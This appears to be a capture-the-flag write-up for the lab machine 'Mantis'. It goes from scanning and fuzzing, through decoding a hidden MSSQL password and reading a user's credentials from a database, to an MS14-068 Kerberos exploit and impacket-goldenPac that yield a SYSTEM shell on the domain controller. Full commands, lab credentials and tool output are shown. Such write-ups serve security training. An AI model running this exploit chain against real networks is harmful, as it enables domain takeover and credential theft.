# Mantis

## Foothold

Nmap Results

```
┌──[Sun Nov  6 02:49:21 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting/oscp]
└──# rscan $ip                                        
rustscan --accessible -u 5000 -b 2500 -a 10.129.228.181 -- -Pn -A

PORT      STATE SERVICE      REASON          VERSION
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-11-06 20:52:43Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
1337/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
1433/tcp  open  ms-sql-s     syn-ack ttl 127 Microsoft SQL Server 2014 12.00.2000.00; RTM
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
8080/tcp  open  http         syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: Tossed Salad - Blog
```

<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption><p>Viewing The Landing Page Appears To Be a Default IIS Server, However, On An Unusual Port</p></figcaption></figure>

```
┌──[Sun Nov  6 05:13:36 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip:1337/FUZZ/ -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.228.181:1337/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

secure_notes            [Status: 200, Size: 477, Words: 41, Lines: 3, Duration: 70ms]
```

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption><p>Viewing The secure_notes Directory Reveals Interesting Files. One With An Interesting Name</p></figcaption></figure>

<figure><img src=".gitbook/assets/image (7) (3).png" alt=""><figcaption><p>The Dev Notes Tells Me That The An SQL User is admin</p></figcaption></figure>

I Decided To Further Look Into The Dev Notes Filename As It Looks Like A Base64 String.

```
┌──[Sun Nov  6 05:24:47 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# echo 'NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx' | base64 -d                                                                                 130 ⨯
6d2424716c5f53405f504073735730726421
```

Decoding The String Shows Which Appears To Be Now A Hex String Revealing A Password

```
┌──[Sun Nov  6 05:24:57 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
└──# hURL 6d2424716c5f53405f504073735730726421 -x

Original HEX      :: 6d2424716c5f53405f504073735730726421
ASCII/RAW DEcoded :: m$$ql_S@_P@ssW0rd!
```

Using The Credentials **admin:m\$$ql\_S@\_P@ssW0rd!** I Proceed to connect to mssql service using dbeaver

<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption><p>Connected To MSSQL</p></figcaption></figure>

## Privilege Escalation

Navigating to an interesting table in the orcharddb reveals james's password

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

With James's password I look up the SID for his user

```
┌──[Sun Nov  6 08:11:31 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/usr/share/windows-kernel-exploits/MS14-068/pykek]
└──# rpcclient $ip -U james                                                                                                                              130 ⨯
Password for [WORKGROUP\james]:
rpcclient $> lookupnames james
james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
```

I then proceed to create a privileged ticket granting ticket

```
┌──[Sun Nov  6 08:12:58 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/usr/share/windows-kernel-exploits/MS14-068/pykek]
└──# python2 ./ms14-068.py -u james@htb.local -p 'J@m3s_P@ssW0rd!' -d $ip -s S-1-5-21-4220043660-4019079961-2895681657-1103
  [+] Building AS-REQ for 10.129.14.169... Done!
  [+] Sending AS-REQ to 10.129.14.169... Done!
  [+] Receiving AS-REP from 10.129.14.169... Done!
  [+] Parsing AS-REP from 10.129.14.169... Done!
  [+] Building TGS-REQ for 10.129.14.169... Done!
  [+] Sending TGS-REQ to 10.129.14.169... Done!
  [+] Receiving TGS-REP from 10.129.14.169... Done!
  [+] Parsing TGS-REP from 10.129.14.169... Done!
  [+] Creating ccache file 'TGT_james@htb.local.ccache'... Done!
```

With impacket's goldenpac tool I supply james credentials and gain system access

```
┌──[Sun Nov  6 08:13:07 PM CST 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/usr/share/windows-kernel-exploits/MS14-068/pykek]
└──# impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local -w /tmp/krb5cc_0             
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file xCmOVFBQ.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service Llrq on mantis.htb.local.....
[*] Starting service Llrq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## User Proof

```
C:\Users\james\Desktop>hostname && whoami && type user.txt && ipconfig /all
mantis
nt authority\system
96f7c833a5c34d01f16b7bd18339a748

Windows IP Configuration

   Host Name . . . . . . . . . . . . : mantis
   Primary Dns Suffix  . . . . . . . : htb.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb.local
                                       .htb

Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #3
   Physical Address. . . . . . . . . : 00-50-56-B9-EC-F6
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::7857:89df:b5b7:7226(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::7857:89df:b5b7:7226%18(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.14.169(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Sunday, November 06, 2022 8:55:16 PM
   Lease Expires . . . . . . . . . . : Sunday, November 06, 2022 11:25:15 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%18
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

C:\Users\james\Desktop>
```

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>user.txt</p></figcaption></figure>

## Root Proof

```
C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all
mantis
nt authority\system
bf685a04a54ed3ac1cb065f28917487d

Windows IP Configuration

   Host Name . . . . . . . . . . . . : mantis
   Primary Dns Suffix  . . . . . . . : htb.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb.local
                                       .htb

Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #3
   Physical Address. . . . . . . . . : 00-50-56-B9-EC-F6
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::7857:89df:b5b7:7226(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::7857:89df:b5b7:7226%18(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.14.169(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Sunday, November 06, 2022 8:55:16 PM
   Lease Expires . . . . . . . . . . : Sunday, November 06, 2022 11:25:15 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%18
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

C:\Users\Administrator\Desktop>
```

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption><p>root.txt</p></figcaption></figure>

## Badge

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
